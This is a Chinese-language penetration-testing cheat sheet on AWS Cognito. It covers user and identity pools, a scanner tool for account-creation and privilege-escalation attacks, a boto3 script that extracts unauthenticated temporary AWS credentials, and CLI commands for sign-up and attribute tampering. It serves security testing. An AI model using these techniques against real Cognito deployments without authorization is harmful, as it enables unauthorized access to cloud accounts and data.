# AWS - 服务 - Cognito

AWS Cognito 是一种 AWS 托管服务，用于身份验证、授权和用户管理。

1. 用户通过 Cognito User Pools (用户池) 进行登录 (身份验证)，或通过联合的身份提供者 (IdP)（如 Google、Facebook、SAML 等）登录。
2. Cognito Identity Pools (身份池) 随后可以将此身份交换为临时的 AWS 凭据 (来自 STS — 安全令牌服务 (Security Token Service))。
3. 这些凭据（访问密钥 ID、私有访问密钥和会话令牌）使应用程序能够使用有限的 IAM 角色/策略直接调用 AWS 服务（例如 S3、DynamoDB、API Gateway）。

## 工具 (Tools)

* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) - 一个用于在 Cognito 上执行攻击（例如 *不需要的帐户创建 (Unwanted account creation)*、*Account Oracle* 和 *身份池提权 (Identity Pool escalation)*）的 CLI 工具。

    ```ps1
    # 安装
    $ pip install cognito-scanner
    # 用法
    $ cognito-scanner --help
    # 获取有关如何使用“不需要的帐户创建”脚本的信息
    $ cognito-scanner account-creation --help
    # 更多详情请访问 https://github.com/padok-team/cognito-scanner
    ```

## 身份池 ID (Identity Pool ID)

* **User Pools (用户池)**：用户池允许进行登录和注册等功能
* **Identity Pools (身份池)**：身份池允许经过身份验证和未经过身份验证的用户使用临时凭据访问 AWS 资源

获得 Cognito 身份池 ID 令牌后，你可以继续进行操作，并使用识别出的令牌为未经过身份验证的角色提取临时 AWS 凭据。

```py
import boto3

region='us-east-1'
identity_pool='us-east-1:5280c436-2198-2b5a-b87c-9f54094x8at9'

client = boto3.client('cognito-identity',region_name=region)
_id = client.get_id(IdentityPoolId=identity_pool)
_id = _id['IdentityId']

credentials = client.get_credentials_for_identity(IdentityId=_id)
access_key = credentials['Credentials']['AccessKeyId']
secret_key = credentials['Credentials']['SecretKey']
session_token = credentials['Credentials']['SessionToken']
identity_id = credentials['IdentityId']
print("Access Key: " + access_key)
print("Secret Key: " + secret_key)
print("Session Token: " + session_token)
print("Identity Id: " + identity_id)
```

## AWS Cognito 命令 (AWS Cognito Commands)

### 获取用户信息 (Get User Information)

```ps1
aws cognito-idp get-user --access-token $(cat access_token.txt)
```

### 管理员身份验证 (Admin Authentication)

```ps1
aws cognito-idp admin-initiate-auth --access-token $(cat access_token)
```

### 列出用户组 (List User Groups)

```ps1
aws cognito-idp admin-list-groups-for-user --username user.name@email.com --user-pool-id "Group-Name"
```

### 注册 (Sign up)

```ps1
aws cognito-idp sign-up --client-id <client-id> --username <username> --password <password>
```

### 修改属性 (Modify Attributes)

```ps1
aws cognito-idp update-user-attributes --access-token $(cat access_token) --user-attributes Name=<attribute>,Value=<value>
```

## 参考资料 (References)

* [Exploiting weak configurations in Amazon Cognito - Pankaj Mouriya - April 6, 2021](https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963)
